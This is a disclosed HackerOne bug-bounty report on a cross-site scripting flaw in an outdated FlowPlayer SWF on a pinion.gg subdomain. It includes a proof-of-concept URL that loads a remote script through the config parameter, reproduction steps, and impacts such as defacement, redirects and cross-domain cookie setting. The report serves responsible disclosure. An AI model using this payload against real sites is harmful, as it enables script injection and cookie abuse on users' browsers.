@@ -1,0 +1,59 @@
+ReportLink:https://hackerone.com/reports/254269
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/sp1d3rs
+ReportedTo:Unikrn(unikrn)
+BountyAmount:30.0
+Severity:low
+State:Closed
+DateOfDisclosure:05.10.2017 21:10:12
+
+Summary:
+
+##Description
+Hi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.
+I discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:
+```
+CACHE MANIFEST
+# 2014-07-07
+CACHE:
+http://bin.pinion.gg/bin/companions.min.js
+http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
+http://vox-static.liverail.com/crossdomain.xml
+http://cdn-static.liverail.com/crossdomain.xml
+http://bs.serving-sys.com/crossdomain.xml
+http://ad-apac.doubleclick.net/crossdomain.xml
+http://ads.intergi.com/crossdomain.xml
+http://u-ads.adap.tv/crossdomain.xml
+http://imasdk.googleapis.com/js/sdkloader/ima3.js
+http://www.googletagservices.com/tag/js/gpt.js
+https://www.google-analytics.com/ga.js
+http://partner.googleadservices.com/gpt/pubads_impl_90.js
+NETWORK:
+*
+```
+
+One string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf
+I submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.
+
+##POC
+http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js
+Just visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.
+
+##Impact
+The vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.
+1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content
+2) Using Open Redirect through `window.location` js payload.
+3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.
+4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.
+
+##Reproduction steps
+You just need to place the malicious file to the remote host, like in this example:
+http://████/test.js
+and append the url to the
+```
+http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=
+```
+as parameter.
+
+##Suggested fix
+I recommend you to update FlowPlayer to the latest version, or remove if not used.
